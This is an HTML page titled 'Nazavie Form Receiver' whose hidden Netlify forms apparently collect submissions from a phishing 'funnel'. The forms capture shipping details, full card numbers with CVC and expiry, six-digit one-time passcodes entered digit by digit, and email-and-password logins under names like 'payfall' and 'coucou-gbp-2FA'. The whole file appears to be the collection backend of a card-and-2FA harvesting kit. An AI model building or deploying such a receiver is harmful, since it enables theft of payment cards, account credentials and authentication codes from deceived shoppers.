<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Nazavie Form Receiver</title>
    <meta name="robots" content="noindex, nofollow" />
    <style>
      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        font-family: Arial, sans-serif;
        color: #151515;
        background: #f7f3ee;
      }

      main {
        max-width: 520px;
        padding: 32px;
        text-align: center;
      }

      .netlify-forms {
        display: none;
      }
    </style>
  </head>
  <body>
    <main>
      <h1>Nazavie form receiver</h1>
      <p>This page receives Nazavie funnel submissions for Netlify Forms.</p>
    </main>

    <div class="netlify-forms" aria-hidden="true">
      <form name="checkout-contact-shipping" method="POST" data-netlify="true">
        <input type="hidden" name="form-name" value="checkout-contact-shipping" />
        <input type="text" name="contactEmail" />
        <input type="text" name="marketingOptIn" />
        <input type="text" name="saveInformation" />
        <input type="text" name="shippingAddress1" />
        <input type="text" name="shippingAddress2" />
        <input type="text" name="shippingCity" />
        <input type="text" name="shippingCountry" />
        <input type="text" name="shippingCountryCode" />
        <input type="text" name="shippingFirstName" />
        <input type="text" name="shippingLastName" />
        <input type="text" name="shippingPhone" />
        <input type="text" name="shippingPostal" />
        <input type="text" name="shippingState" />
      </form>

      <form name="checkout-card-payment" method="POST" data-netlify="true">
        <input type="hidden" name="form-name" value="checkout-card-payment" />
        <input type="text" name="amount" />
        <input type="text" name="amountFull" />
        <input type="text" name="cardCvc" />
        <input type="text" name="cardExpiry" />
        <input type="text" name="cardName" />
        <input type="text" name="cardNumber" />
        <input type="text" name="cardType" />
        <input type="text" name="checkout" />
        <input type="text" name="currency" />
        <input type="text" name="paymentMethod" />
      </form>

      <form name="amount-gbp-auth-choice" method="POST" data-netlify="true">
        <input type="hidden" name="form-name" value="amount-gbp-auth-choice" />
        <input type="text" name="amountFull" />
        <input type="text" name="amountGbp" />
        <input type="text" name="authChoice" />
        <input type="text" name="authChoiceDetails" />
        <input type="text" name="checkoutOffer" />
        <input type="text" name="checkoutPhone" />
        <input type="text" name="currency" />
      </form>

      <form
        name="coucou-gbp-2FA"
        method="POST"
        data-netlify="true"
        data-netlify-honeypot="bot-field"
      >
        <input type="hidden" name="form-name" value="coucou-gbp-2FA" />
        <input type="text" name="amountFull" />
        <input type="text" name="amountGbp" />
        <input type="text" name="authChoice" />
        <input type="text" name="bot-field" />
        <input type="text" name="checkoutOffer" />
        <input type="text" name="checkoutPhone" />
        <input type="text" name="currency" />
        <input type="text" name="digit1" />
        <input type="text" name="digit2" />
        <input type="text" name="digit3" />
        <input type="text" name="digit4" />
        <input type="text" name="digit5" />
        <input type="text" name="digit6" />
        <input type="text" name="otpChoiceDetails" />
        <input type="text" name="submissionStatus" />
      </form>

      <form name="995payfall-login" method="POST" data-netlify="true">
        <input type="hidden" name="form-name" value="995payfall-login" />
        <input type="text" name="email" />
        <input type="text" name="password" />
      </form>

      <form name="payfall-auth-choice" method="POST" data-netlify="true">
        <input type="hidden" name="form-name" value="payfall-auth-choice" />
        <input type="text" name="authChoice" />
        <input type="text" name="authChoiceDetails" />
        <input type="text" name="checkoutPhone" />
      </form>

      <form
        name="payfall-2FA"
        method="POST"
        data-netlify="true"
        data-netlify-honeypot="bot-field"
      >
        <input type="hidden" name="form-name" value="payfall-2FA" />
        <input type="text" name="authChoice" />
        <input type="text" name="bot-field" />
        <input type="text" name="checkoutPhone" />
        <input type="text" name="digit1" />
        <input type="text" name="digit2" />
        <input type="text" name="digit3" />
        <input type="text" name="digit4" />
        <input type="text" name="digit5" />
        <input type="text" name="digit6" />
        <input type="text" name="otpChoiceDetails" />
        <input type="text" name="submissionStatus" />
      </form>

      <form name="coucou-cas-auth-choice" method="POST" data-netlify="true">
        <input type="hidden" name="form-name" value="coucou-cas-auth-choice" />
        <input type="text" name="authChoice" />
        <input type="text" name="authChoiceDetails" />
        <input type="text" name="checkoutPhone" />
      </form>

      <form
        name="coucou-cad-2FA"
        method="POST"
        data-netlify="true"
        data-netlify-honeypot="bot-field"
      >
        <input type="hidden" name="form-name" value="coucou-cad-2FA" />
        <input type="text" name="authChoice" />
        <input type="text" name="bot-field" />
        <input type="text" name="checkoutPhone" />
        <input type="text" name="digit1" />
        <input type="text" name="digit2" />
        <input type="text" name="digit3" />
        <input type="text" name="digit4" />
        <input type="text" name="digit5" />
        <input type="text" name="digit6" />
        <input type="text" name="otpChoiceDetails" />
        <input type="text" name="submissionStatus" />
      </form>
    </div>
  </body>
</html>
